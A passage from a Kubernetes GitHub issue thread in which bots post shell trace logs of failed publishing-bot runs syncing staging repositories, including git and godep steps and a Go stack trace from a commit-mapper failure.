--exit-code\n>\t+ return 0\n>\t+ echo 'Godeps.json hasn'\\''t changed!'\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\tGodeps.json hasn't changed!\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' master '!=' master ']'\n>\t+ '[' -n '' ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ git diff --exit-code 31ae05d8096db803f5b4ff16cda6059c0a9cc861\n>\t+ echo 'Remove redundant godep commits on-top of 31ae05d8096db803f5b4ff16cda6059c0a9cc861.'\n>\t+ git reset --soft -q 31ae05d8096db803f5b4ff16cda6059c0a9cc861\n>\tRemove redundant godep commits on-top of 31ae05d8096db803f5b4ff16cda6059c0a9cc861.\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t++ basename /go-workspace/src/k8s.io/csi-api\n>\t+ local repo=csi-api\n>\t++ git log --oneline --first-parent --merges\n>\t++ head -n 1\n>\t+ '[' -n '31ae05d Merge pull request #68238 from justinsb/update_reflect2_to_101' ']'\n>\t+ echo 'Writing k8s.io/kubernetes commit lookup table to ../kube-commits-csi-api-master'\n>\tWriting k8s.io/kubernetes commit lookup table to ../kube-commits-csi-api-master\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /collapsed-kube-commit-mapper --commit-message-tag Kubernetes-commit --source-branch refs/heads/upstream-branch\n>\tF1003 04:36:33.929483   30637 main.go:123] Failed to map upstream branch refs/heads/upstream-branch to HEAD: failed to build merge point table: packfile not found\n>\tgoroutine 1 [running]:\n>\tk8s.io/publishing-bot/vendor/github.com/golang/glog.stacks(0xc442844300, 0xc4427ae000, 0xa3, 0xf7)\n>\t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:769 +0xcf\n>\tk8s.io/publishing-bot/vendor/github.com/golang/glog.(*loggingT).output(0x9edf20, 0xc400000003, 0xc4200f0000, 0x9a0d81, 0x7, 0x7b, 0x0)\n>\t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:720 +0x32d\n>\tk8s.io/publishing-bot/vendor/github.com/golang/glog.(*loggingT).printf(0x9edf20, 0xc400000003, 0x7dba9b, 0x2c, 0xc4365a9e48, 0x2, 0x2)\n>\t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:655 +0x14b\n>\tk8s.io/publishing-bot/vendor/github.com/golang/glog.Fatalf(0x7dba9b, 0x2c, 0xc4365a9e48, 0x2, 0x2)\n>\t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:1148 +0x67\n>\tmain.main()\n>\t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/cmd/collapsed-kube-commit-mapper/main.go:123 +0x890\n>[03 Oct 18 04:36 UTC]: exit status 255\n>    \t+ '[' '!' 14 -eq 14 ']'\n>    \t+ REPO=csi-api\n>    \t+ SRC_BRANCH=master\n>    \t+ DST_BRANCH=master\n>    \t+ DEPS=apimachinery:master,api:master,client-go:master,apiextensions-apiserver:master\n>    \t+ REQUIRED=\n>    \t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>    \t+ SUBDIR=staging/src/k8s.io/csi-api\n>    \t+ SOURCE_REPO_ORG=kubernetes\n>    \t+ SOURCE_REPO_NAME=kubernetes\n>    \t+ shift 9\n>    \t+ BASE_PACKAGE=k8s.io\n>    \t+ IS_LIBRARY=true\n>    \t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ SKIP_TAGS=\n>    \t+ LAST_PUBLISHED_UPSTREAM_HASH=f11ea40ed011889985e5ac8998741b4377e3f85a\n>    \t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>    \t++ dirname /publish_scripts/construct.sh\n>    \t+ SCRIPT_DIR=/publish_scripts\n>    \t+ source /publish_scripts/util.sh\n>    \t++ set -o errexit\n>    \t++ set -o nounset\n>    \t++ set -o pipefail\n>    \t++ set -o xtrace\n>    \t+ echo 'Running garbage collection.'\n>    \t+ git gc --auto\n>    \t+ echo 'Fetching from origin.'\n>    \t+ git fetch origin --no-tags --prune\n>    \t+ echo 'Cleaning up checkout.'\n>    \t+ git rebase --abort\n>    \tNo rebase in progress?\n>    \t+ true\n>    \t+ git reset -q --hard\n>    \t+ git clean -q -f -f -d\n>    \t++ git rev-parse HEAD\n>    \t+ git checkout -q 833a598b67614ffea5b04ec1fc5bc3e5f6883e56\n>    \t+ git branch -D master\n>    \t+ git remote set-head origin -d\n>    \t+ git rev-parse origin/master\n>    \t+ echo 'Switching to origin/master.'\n>    \t+ git branch -f master origin/master\n>    \t+ git checkout -q master\n>    \t+ echo 'Fetching upstream changes.'\n>    \t+ git remote\n>    \t+ grep -w -q upstream\n>    \t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>    \t+ git fetch -q upstream --no-tags --prune\n>    \t++ git rev-parse upstream/master\n>    \t+ UPSTREAM_HASH=c179a9c9df4bfb6421258a5f31da9f595474ada4\n>    \t+ '[' c179a9c9df4bfb6421258a5f31da9f595474ada4 '!=' f11ea40ed011889985e5ac8998741b4377e3f85a ']'\n>    \t+ echo 'Upstream branch upstream/master moved from '\\''f11ea40ed011889985e5ac8998741b4377e3f85a'\\'' to '\\''c179a9c9df4bfb6421258a5f31da9f595474ada4'\\''. We have to sync.'\n>    \t+ sync_repo kubernetes kubernetes staging/src/k8s.io/csi-api master master apimachinery:master,api:master,client-go:master,apiextensions-apiserver:master '' k8s.io true 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local source_repo_org=kubernetes\n>    \t+ local source_repo_name=kubernetes\n>    \t+ local subdirectory=staging/src/k8s.io/csi-api\n>    \t+ local src_branch=master\n>    \t+ local dst_branch=master\n>    \t+ local deps=apimachinery:master,api:master,client-go:master,apiextensions-apiserver:master\n>    \t+ local required_packages=\n>    \t+ local base_package=k8s.io\n>    \t+ local is_library=true\n>    \t+ shift 9\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ readonly subdirectory src_branch dst_branch deps is_library\n>    \t+ local new_branch=false\n>    \t+ local orphan=false\n>    \t+ git rev-parse -q --verify HEAD\n>    \t++ ls -1\n>    \t++ wc -l\n>    \t+ '[' 10 = 0 ']'\n>    \t++ git rev-parse HEAD\n>    \t+ echo 'Starting at existing master commit 31ae05d8096db803f5b4ff16cda6059c0a9cc861.'\n>    \t+ git branch -D filtered-branch\n>    \t+ git branch -f upstream-branch upstream/master\n>    \t++ git rev-parse upstream-branch\n>    \t+ echo 'Checked out source commit c179a9c9df4bfb6421258a5f31da9f595474ada4.'\n>    \t+ git checkout -q upstream-branch -b filtered-branch\n>    \t+ git reset -q --hard upstream-branch\n>    \t+ local f_mainline_commits=\n>    \t+ '[' false = true ']'\n>    \t+ '[' false = true ']'\n>    \t++ last-kube-commit Kubernetes-commit master\n>    \t++ local commit_msg_tag=Kubernetes-commit\n>    \t++ grep '^Kubernetes-commit: '\n>    \t++ git log --format=%B master\n>    \t++ sed 's/^Kubernetes-commit: //g'\n>    \t++ head -n 1\n>    \t+ local k_base_commit=a94ea824eb59e92188f166c302d7995ba9002667\n>    \t+ '[' -z a94ea824eb59e92188f166c302d7995ba9002667 ']'\n>    \t++ git-find-merge a94ea824eb59e92188f166c302d7995ba9002667 upstream/master\n>    \t++ tail -1\n>    \t+++ git rev-list 'a94ea824eb59e92188f166c302d7995ba9002667^1..upstream/master' --first-parent\n>    \t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>    \t+++ git rev-list a94ea824eb59e92188f166c302d7995ba9002667..upstream/master --ancestry-path\n>    \t+++ git rev-parse a94ea824eb59e92188f166c302d7995ba9002667\n>    \t+ local k_base_merge=a94ea824eb59e92188f166c302d7995ba9002667\n>    \t+ '[' -z a94ea824eb59e92188f166c302d7995ba9002667 ']'\n>    \t+ git branch -f filtered-branch-base a94ea824eb59e92188f166c302d7995ba9002667\n>    \t+ echo 'Rewriting upstream branch master to only include commits for staging/src/k8s.io/csi-api.'\n>    \t+ filter-branch Kubernetes-commit staging/src/k8s.io/csi-api 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' filtered-branch filtered-branch-base\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ local subdirectory=staging/src/k8s.io/csi-api\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ echo 'Running git filter-branch ...'\n>    \t+ local index_filter=\n>    \t+ '[' -n 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>    \t+ patterns=()\n>    \t+ local patterns\n>    \t+ local p=\n>    \t+ index_filter='git rm -q --cached --ignore-unmatch -r'\n>    \t+ IFS=' '\n>    \t+ read -ra patterns\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''BUILD'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''*/BUILD'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''BUILD.bazel'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''*/BUILD.bazel'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''Gopkg.toml'\\'''\n>    \t+ git filter-branch -f --index-filter 'git rm -q --cached --ignore-unmatch -r '\\''BUILD'\\'' '\\''*/BUILD'\\'' '\\''BUILD.bazel'\\'' '\\''*/BUILD.bazel'\\'' '\\''Gopkg.toml'\\''' --msg-filter 'awk 1 && echo && echo \"Kubernetes-commit: ${GIT_COMMIT}\"' --subdirectory-filter staging/src/k8s.io/csi-api -- filtered-branch filtered-branch-base\n>    \t++ git rev-parse filtered-branch-base\n>    \t+ local f_base_commit=935cc6b5b5d523aded922f72b39488769d3f431d\n>    \t++ git log --first-parent --format=%H --reverse 935cc6b5b5d523aded922f72b39488769d3f431d..HEAD\n>    \t+ f_mainline_commits=\n>    \t+ echo 'Checking out branch master.'\n>    \t+ git checkout -q master\n>    \t+ '[' -f kubernetes-sha ']'\n>    \t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>    \t+ local split_recursive_delete_pattern\n>    \t+ read -r -a split_recursive_delete_pattern\n>    \t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>    \t+ git add -u\n>    \t+ git-index-clean\n>    \t+ git diff --cached --exit-code\n>    \t+ return 0\n>    \t++ git rev-parse HEAD\n>    \t+ local dst_old_head=31ae05d8096db803f5b4ff16cda6059c0a9cc861\n>    \t+ local k_pending_merge_commit=\n>    \t+ local dst_needs_godeps_update=false\n>    \t++ git rev-parse HEAD\n>    \t+ local dst_merge_point_commit=31ae05d8096db803f5b4ff16cda6059c0a9cc861\n>    \t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>    \t+ local k_mainline_commit=\n>    \t+ local k_new_pending_merge_commit=\n>    \t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>    \t+ k_new_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>    \t+ '[' -n '' ']'\n>    \t+ k_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>    \t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>    \t+ break\n>    \t+ echo 'Fixing up godeps after a complete sync'\n>    \t++ git rev-parse HEAD\n>    \t+ '[' 31ae05d8096db803f5b4ff16cda6059c0a9cc861 '!=' 31ae05d8096db803f5b4ff16cda6059c0a9cc861 ']'\n>    \t+ '[' false = true ']'\n>    \t+ fix-godeps apimachinery:master,api:master,client-go:master,apiextensions-apiserver:master '' k8s.io true true false Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ '[' '' = true ']'\n>    \t+ local deps=apimachinery:master,api:master,client-go:master,apiextensions-apiserver:master\n>    \t+ local required_packages=\n>    \t+ local base_package=k8s.io\n>    \t+ local is_library=true\n>    \t+ local needs_godeps_update=true\n>    \t+ local squash=false\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t++ git rev-parse HEAD\n>    \t+ local dst_old_commit=31ae05d8096db803f5b4ff16cda6059c0a9cc861\n>    \t+ '[' true = true ']'\n>    \t+ update_full_godeps apimachinery:master,api:master,client-go:master,apiextensions-apiserver:master k8s.io true Kubernetes-commit\n>    \t+ local deps=apimachinery:master,api:master,client-go:master,apiextensions-apiserver:master\n>    \t+ local base_package=k8s.io\n>    \t+ local is_library=true\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ ensure-clean-working-dir\n>    \t+ git diff HEAD --exit-code\n>    \t+ for d in '$../*'\n>    \t+ '[' '!' -d '$../*' ']'\n>    \t+ continue\n>    \t+ '[' '!' -f Godeps/Godeps.json ']'\n>    \t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>    \t+ local dep=\n>    \t+ local branch=\n>    \t+ local depbranch=\n>    \t++ basename /go-workspace/src/k8s.io/csi-api\n>    \t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>    \t+ IFS=:\n>    \t+ read dep branch\n>    \t+ indent-godeps\n>    \t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apimachinery/\") or . == \"k8s.io/apimachinery\") | not))' Godeps/Godeps.json\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>    \t+ IFS=:\n>    \t+ read dep branch\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/api/\") or . == \"k8s.io/api\") | not))' Godeps/Godeps.json\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>    \t+ IFS=:\n>    \t+ read dep branch\n>    \t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/client-go/\") or . == \"k8s.io/client-go\") | not))' Godeps/Godeps.json\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>    \t+ IFS=:\n>    \t+ read dep branch\n>    \t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apiextensions-apiserver/\") or . == \"k8s.io/apiextensions-apiserver\") | not))' Godeps/Godeps.json\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>    \t+ IFS=:\n>    \t+ read dep branch\n>    \t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/csi-api/\") or . == \"k8s.io/csi-api\") | not))' Godeps/Godeps.json\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ echo 'Running godep restore.'\n>    \t+ godep restore\n>    \t+ checkout-deps-to-kube-commit Kubernetes-commit apimachinery:master,api:master,client-go:master,apiextensions-apiserver:master\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ deps=()\n>    \t+ local deps\n>    \t+ IFS=,\n>    \t+ read -a deps\n>    \t++ last-kube-commit Kubernetes-commit HEAD\n>    \t++ local commit_msg_tag=Kubernetes-commit\n>    \t++ git log --format=%B HEAD\n>    \t++ head -n 1\n>    \t++ grep '^Kubernetes-commit: '\n>    \t++ sed 's/^Kubernetes-commit: //g'\n>    \t+ local k_last_kube_commit=a94ea824eb59e92188f166c302d7995ba9002667\n>    \t+ '[' -z a94ea824eb59e92188f166c302d7995ba9002667 ']'\n>    \t++ git-find-merge a94ea824eb59e92188f166c302d7995ba9002667 upstream-branch\n>    \t++ tail -1\n>    \t+++ git rev-list 'a94ea824eb59e92188f166c302d7995ba9002667^1..upstream-branch' --first-parent\n>    \t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>    \t+++ git rev-list a94ea824eb59e92188f166c302d7995ba9002667..upstream-branch --ancestry-path\n>    \t+++ git rev-parse a94ea824eb59e92188f166c302d7995ba9002667\n>    \t+ local k_last_kube_merge=a94ea824eb59e92188f166c302d7995ba9002667\n>    \t+ local dep_count=4\n>    \t+ (( i=0 ))\n>    \t+ (( i<4 ))\n>    \t+ local dep=apimachinery\n>    \t+ local branch=master\n>    \t+ echo 'Looking up which commit in the master branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit a94ea824eb59e92188f166c302d7995ba9002667.'\n>    \t+ local k_commit=\n>    \t+ local dep_commit=\n>    \t+ read k_commit dep_commit\n>    \t++ look -b a94ea824eb59e92188f166c302d7995ba9002667 ../kube-commits-apimachinery-master\n>    \t+ '[' -z b90fb3933738446b5a2196f37f3a8d24cbc5eb93 ']'\n>    \t+ pushd ../apimachinery\n>    \t+ echo 'Checking out k8s.io/apimachinery to b90fb3933738446b5a2196f37f3a8d24cbc5eb93'\n>    \t+ git checkout -q b90fb3933738446b5a2196f37f3a8d24cbc5eb93\n>    \t+ popd\n>    \t+ (( i++  ))\n>    \t+ (( i<4 ))\n>    \t+ local dep=api\n>    \t+ local branch=master\n>    \t+ echo 'Looking up which commit in the master branch of k8s.io/api corresponds to k8s.io/kubernetes commit a94ea824eb59e92188f166c302d7995ba9002667.'\n>    \t+ local k_commit=\n>    \t+ local dep_commit=\n>    \t+ read k_commit dep_commit\n>    \t++ look -b a94ea824eb59e92188f166c302d7995ba9002667 ../kube-commits-api-master\n>    \t+ '[' -z 0d2438381651a1fe2816a9ac1923eeefa129e254 ']'\n>    \t+ pushd ../api\n>    \t+ echo 'Checking out k8s.io/api to 0d2438381651a1fe2816a9ac1923eeefa129e254'\n>    \t+ git checkout -q 0d2438381651a1fe2816a9ac1923eeefa129e254\n>    \t+ popd\n>    \t+ (( i++  ))\n>    \t+ (( i<4 ))\n>    \t+ local dep=client-go\n>    \t+ local branch=master\n>    \t+ echo 'Looking up which commit in the master branch of k8s.io/client-go corresponds to k8s.io/kubernetes commit a94ea824eb59e92188f166c302d7995ba9002667.'\n>    \t+ local k_commit=\n>    \t+ local dep_commit=\n>    \t+ read k_commit dep_commit\n>    \t++ look -b a94ea824eb59e92188f166c302d7995ba9002667 ../kube-commits-client-go-master\n>    \t+ '[' -z 087039522ddde9317ecf61500c4ebe598e9f69cb ']'\n>    \t+ pushd ../client-go\n>    \t+ echo 'Checking out k8s.io/client-go to 087039522ddde9317ecf61500c4ebe598e9f69cb'\n>    \t+ git checkout -q 087039522ddde9317ecf61500c4ebe598e9f69cb\n>    \t+ popd\n>    \t+ (( i++  ))\n>    \t+ (( i<4 ))\n>    \t+ local dep=apiextensions-apiserver\n>    \t+ local branch=master\n>    \t+ echo 'Looking up which commit in the master branch of k8s.io/apiextensions-apiserver corresponds to k8s.io/kubernetes commit a94ea824eb59e92188f166c302d7995ba9002667.'\n>    \t+ local k_commit=\n>    \t+ local dep_commit=\n>    \t+ read k_commit dep_commit\n>    \t++ look -b a94ea824eb59e92188f166c302d7995ba9002667 ../kube-commits-apiextensions-apiserver-master\n>    \t+ '[' -z 05e89e265cc594459a3d33a63e779d94e6614c63 ']'\n>    \t+ pushd ../apiextensions-apiserver\n>    \t+ echo 'Checking out k8s.io/apiextensions-apiserver to 05e89e265cc594459a3d33a63e779d94e6614c63'\n>    \t+ git checkout -q 05e89e265cc594459a3d33a63e779d94e6614c63\n>    \t+ popd\n>    \t+ (( i++  ))\n>    \t+ (( i<4 ))\n>    \t+ rm -rf ./Godeps\n>    \t+ rm -rf ./vendor\n>    \t+ echo 'Running godep save.'\n>    \t+ godep save ./...\n>    \t+ cp Godeps/Godeps.json Godeps/Godeps.json.preserve\n>    \t+ git checkout HEAD Godeps/\n>    \t+ mv Godeps/Godeps.json.preserve Godeps/Godeps.json\n>    \t+ jq 'del(.Deps[].Comment)' Godeps/Godeps.json\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ '[' true = true ']'\n>    \t++ git rev-parse --abbrev-ref HEAD\n>    \t+ '[' master '!=' master ']'\n>    \t+ echo 'Removing k8s.io/*, gofuzz, go-openapi and glog from vendor/ because this is a library.'\n>    \t+ rm -rf ./vendor/github.com/golang/glog\n>    \t+ rm -rf ./vendor/k8s.io\n>    \t+ rm -rf ./vendor/github.com/google/gofuzz\n>    \t+ rm -rf ./vendor/github.com/go-openapi\n>    \t+ git add Godeps/Godeps.json\n>    \t+ git clean -f Godeps\n>    \t+ git add vendor/ --ignore-errors\n>    \t+ git-index-clean\n>    \t+ git diff --cached --exit-code\n>    \t+ return 0\n>    \t+ echo 'Godeps.json hasn'\\''t changed!'\n>    \t+ ensure-clean-working-dir\n>    \t+ git diff HEAD --exit-code\n>    \t++ git rev-parse --abbrev-ref HEAD\n>    \t+ '[' master '!=' master ']'\n>    \t+ '[' -n '' ']'\n>    \t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>    \t+ local split_recursive_delete_pattern\n>    \t+ read -r -a split_recursive_delete_pattern\n>    \t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>    \t+ git add -u\n>    \t+ git-index-clean\n>    \t+ git diff --cached --exit-code\n>    \t+ return 0\n>    \t+ git diff --exit-code 31ae05d8096db803f5b4ff16cda6059c0a9cc861\n>    \t+ echo 'Remove redundant godep commits on-top of 31ae05d8096db803f5b4ff16cda6059c0a9cc861.'\n>    \t+ git reset --soft -q 31ae05d8096db803f5b4ff16cda6059c0a9cc861\n>    \t+ ensure-clean-working-dir\n>    \t+ git diff HEAD --exit-code\n>    \t++ basename /go-workspace/src/k8s.io/csi-api\n>    \t+ local repo=csi-api\n>    \t++ git log --oneline --first-parent --merges\n>    \t++ head -n 1\n>    \t+ '[' -n '31ae05d Merge pull request #68238 from justinsb/update_reflect2_to_101' ']'\n>    \t+ echo 'Writing k8s.io/kubernetes commit lookup table to ../kube-commits-csi-api-master'\n>    \t++ echo kubernetes\n>    \t++ sed 's/^./\\L\\u&/'\n>    \t+ /collapsed-kube-commit-mapper --commit-message-tag Kubernetes-commit --source-branch refs/heads/upstream-branch\n>    \tF1003 04:36:33.929483   30637 main.go:123] Failed to map upstream branch refs/heads/upstream-branch to HEAD: failed to build merge point table: packfile not found\n>    \tgoroutine 1 [running]:\n>    \tk8s.io/publishing-bot/vendor/github.com/golang/glog.stacks(0xc442844300, 0xc4427ae000, 0xa3, 0xf7)\n>    \t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:769 +0xcf\n>    \tk8s.io/publishing-bot/vendor/github.com/golang/glog.(*loggingT).output(0x9edf20, 0xc400000003, 0xc4200f0000, 0x9a0d81, 0x7, 0x7b, 0x0)\n>    \t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:720 +0x32d\n>    \tk8s.io/publishing-bot/vendor/github.com/golang/glog.(*loggingT).printf(0x9edf20, 0xc400000003, 0x7dba9b, 0x2c, 0xc4365a9e48, 0x2, 0x2)\n>    \t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:655 +0x14b\n>    \tk8s.io/publishing-bot/vendor/github.com/golang/glog.Fatalf(0x7dba9b, 0x2c, 0xc4365a9e48, 0x2, 0x2)\n>    \t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:1148 +0x67\n>    \tmain.main()\n>    \t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/cmd/collapsed-kube-commit-mapper/main.go:123 +0x890\n>\n>[03 Oct 18 04:36 UTC]: exit status 255```\n>\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "k8s-ci-robot", "body": "@k8s-publishing-bot: Reopening this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/56876#issuecomment-427217562):\n\n>/reopen\n>\n>The last publishing run failed: exit status 255\n>```\n>...ream\n>\t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags --prune\n>\t++ git rev-parse upstream/release-1.10\n>\t+ UPSTREAM_HASH=e749dfaeac568d039634248b9017eaf66c37e4ca\n>\t+ '[' e749dfaeac568d039634248b9017eaf66c37e4ca '!=' e749dfaeac568d039634248b9017eaf66c37e4ca ']'\n>\t+ echo 'Skipping sync because upstream/release-1.10 at e749dfaeac568d039634248b9017eaf66c37e4ca did not change since last sync.'\n>\tSkipping sync because upstream/release-1.10 at e749dfaeac568d039634248b9017eaf66c37e4ca did not change since last sync.\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=release-1.10\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=f584b16eb23bd2a3fd292a027d698d95db427c5d\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-apiextensions-apiserver-release-1.10.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-apiextensions-apiserver-release-1.10.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch release-1.10 --push-script ../push-tags-apiextensions-apiserver-release-1.10.sh --dependencies apimachinery:release-1.10,api:release-1.10,client-go:release-7.0,apiserver:release-1.10,code-generator:release-1.10 --mapping-output-file '../tag-apiextensions-apiserver-{{.Tag}}-mapping' -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"upstream\".\n>\tFetching tags from remote \"origin\".\n>\t++ git rev-parse release-1.10\n>\t+ '[' f584b16eb23bd2a3fd292a027d698d95db427c5d '!=' f584b16eb23bd2a3fd292a027d698d95db427c5d ']'\n>\t+ git checkout release-1.10\n>\tAlready on 'release-1.10'\n>\tYour branch is up-to-date with 'origin/release-1.10'.\n>[05 Oct 18 01:15 UTC]: Successfully constructed release-1.10\n>[05 Oct 18 01:15 UTC]: /publish_scripts/construct.sh apiextensions-apiserver release-1.11 release-1.11 apimachinery:release-1.11,api:release-1.11,client-go:release-8.0,apiserver:release-1.11,code-generator:release-1.11 k8s.io/code-generator /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/apiextensions-apiserver kubernetes kubernetes k8s.io false \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  cd6e3aed88a18b65cebe65e2e577455b0352ccf5\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=apiextensions-apiserver\n>\t+ SRC_BRANCH=release-1.11\n>\t+ DST_BRANCH=release-1.11\n>\t+ DEPS=apimachinery:release-1.11,api:release-1.11,client-go:release-8.0,apiserver:release-1.11,code-generator:release-1.11\n>\t+ REQUIRED=k8s.io/code-generator\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ 